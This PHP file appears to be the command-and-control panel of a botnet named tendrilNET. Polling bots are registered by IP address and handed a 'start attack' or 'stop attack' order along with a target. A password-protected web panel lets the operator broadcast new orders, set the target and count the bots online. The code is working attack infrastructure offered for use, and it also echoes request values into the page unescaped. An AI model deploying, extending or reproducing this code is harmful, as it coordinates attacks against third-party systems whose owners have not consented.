<?php
/*
########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of tendrilNET
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################
*/

$configFile = "data/config";
$botFile = "data/bots";
$passFile = "data/password";

// load config (parameters for attack)
$conf = fopen($configFile, "r");
$content = fread($conf, filesize($configFile));
fclose($conf);
$content = explode("\n", $content);

$order = $content[0];
$target = $content[1];

$timestamp = time();

// load password
$pw = fopen($passFile, "r");
$pwContent = fread($pw, filesize($passFile));
fclose($pw);
$curPw = explode("\n", $pwContent);
$curPw = $curPw[0];

if($_GET['p'] == "bot") {
	print $order."\n".$target;

	// save bot parameter
	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
	// read bots
	$bots = fopen($botFile, "r");
	$botsContent = fread($bots, filesize($botFile));
	fclose($bots);
	$botsContent = explode("\n", $botsContent);
	$writeBotsContent = "";
	$botInList = 0;
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if current bot already in list update timestamp
		if($curBot[0] == $clientIpAddress) {
			$botsContent[$i] = $clientIpAddress." ".$timestamp;
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
			$botInList = 1;
		}
		// if bot in list is out of date, remove him
		elseif(($timestamp - (int)$curBot[1]) > 60) {
			// pass
		}
		else {
			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
		}
	}

	if ($botInList == 0) {
		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp;
	}

	$writeBots = fopen($botFile, "w");
	fwrite($writeBots, $writeBotsContent);
	fclose($writeBots);
}
elseif(hash("sha512", $_GET['p']) == $curPw) {
	// delete timed out bots
	// read bots
        $bots = fopen($botFile, "r");
        $botsContent = fread($bots, filesize($botFile));
        fclose($bots);
        $botsContent = explode("\n", $botsContent);
        $writeBotsContent = "";
	for($i = 0; $i < count($botsContent); $i++) {
		$curBot = explode(" ", $botsContent[$i]);
		// if bot in list is out of date, remove him
                if(($timestamp - (int)$curBot[1]) > 60) {
                        // pass
                }
                else {
                        $writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
                }

	}
	$writeBots = fopen($botFile, "w");
        fwrite($writeBots, $writeBotsContent);
        fclose($writeBots);

	// save new config
	if($_GET['order'] != "" && $_GET['target'] != "") {
		$writeConf = fopen($configFile, "w");
		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
		fclose($writeConf);
		$order = $_GET['order'];
		$target = $_GET['target'];
	}

	// save new password
	if($_GET['np'] != "") {
		$writePw = fopen($passFile, "w");
		fwrite($writePw, hash("sha512", $_GET['np'])."\n");
		fclose($writePw);
		$curPw = $_GET['np'];
	}

	// display panel
	print "<!DOCTYPE html>";
	print "<html>";
	print "<head>";
	print "<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css\">";
	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
	print "<script src=\"//code.jquery.com/jquery-1.10.2.js\"></script>";
	print "<script src=\"//code.jquery.com/ui/1.11.3/jquery-ui.js\"></script>";
	print "<link rel=\"stylesheet\" href=\"/resources/demos/style.css\">";
	print "<script>";
	print "$(function() {";
	print "$( \"#tabs\" ).tabs();";
	print "$( \"#accordion\" ).accordion();";
	print "$( \"#attackorder\" ).selectmenu();";
	print "});";
	print "</script>";
	print "<style>";
	print "select {";
	print "width: 150px;";
	print "}";
	print "</style>";
	print "</head>";
	print "<body id=\"bodyLogin\">";

	print "<table border=\"0\" id=\"tablePanel\"><tr><td>";
	print "<img id=\"headlineLogin\" src=\"images/logo.png\"></td></tr><tr><td>";
	print "<div id=\"tabs\" style=\"background: #d3d3d3;\">";
	print "<ul>";
	print "<li><a href=\"#tabs-1\">Welcome</a></li>";
	print "<li><a href=\"#tabs-2\">Settings</a></li>";
	print "</ul>";

	print "<div id=\"tabs-1\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
	print "<div id=\"accordion\">";
	print "<h3>Attack Status</h3>";
	print "<div>";
	print "<table border=\"0\">";
	print "<tr id=\"trMain\"><td>Status:</td>";
	print "<td align=\"center\">";
	if ($order == "no") {
		print "Not attacking.";
	}
	if ($order == "yes") {
		print "Attacking...";
	}
	print "</td></tr>";
	print "<tr id=\"trAlt\"><td>Target:</td>";
	print "<td align=\"center\">".$target."</td></tr>";
	print "<tr id=\"trMain\"><td>Bots Online:</td>";
	print "<td align=\"center\">";
	$activeBots = fopen($botFile, "r");
        $content = fread($activeBots, filesize($botFile));
        fclose($activeBots);
        $number = explode("\n", $content);
        print count($number)-1;
	print "</td></tr>";

	print "</table>";
	print "</div>";

	// change orders form
	print "<h3>Broadcast New Orders</h3>";
	print "<div>";
	print "<form method=\"get\">";
	print "<table border=\"0\"><tr>";
	print "<td><select name=\"order\" id=\"attackorder\">";
	print "<option value=\"yes\">start attack</option>";
	print "<option value=\"no\">stop attack</option>";
	print "</select></td>";
        print "<td><input id=\"input\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
	if ($_GET['np'] == "") {
		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
	}
	else {
		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
	}
        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
	print "</tr></table>";
        print "</form>";
	print "</div>";
	print "</div>";
	print "</div>";

	// change password form
	print "<div id=\"tabs-2\" style=\"font-family:  Arial, sans-serif; font-size: 14px;\">";
	print "<form method=\"get\">";
	print "<table border=\"0\"><tr>";
        print "<td>Change password: </td><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"old password\"></td>";
        print "<td><input id=\"input\" type=\"password\" name=\"np\" placeholder=\"new password\"></td>";
        print "<td><input id=\"loginButton\" type=\"submit\" value=\"Submit\"></td>";
	print "</tr></table>";
        print "</form>";

	print "</div>";
	print "</td></tr></table>";

	print "</body>";
	print "</html>";

}
else {
	// login form
	print "<!DOCTYPE html>";
	print "<html>";
	print "<head>";
	print "<title>tendrilNET Login Panel</title>";
	print "<link rel=\"stylesheet\" type=\"text/css\" href=\"style.css\">";
	print "</head>";
	print "<body id=\"bodyLogin\">";

	print "<table border=\"0\" id=\"loginTable\"><tr><td>";
	print "<img id=\"headlineLogin\" src=\"images/logo.png\">";
	print "</td></tr><tr><td>";
	print "<div id=\"loginForm\">";
	print "<form method=\"get\">";
	print "<table border=\"0\" align=\"center\">";
	print "<tr><td><input id=\"input\" type=\"password\" name=\"p\" placeholder=\"Password\"></td>";
	print "<td><input id=\"loginButton\" type=\"submit\" value=\"Login\"></td></tr>";
	print "</table>";
	print "</form>";
	print "</div>";
	print "</td></tr></table>";

	print "</body>";
	print "</html>";
}
?>
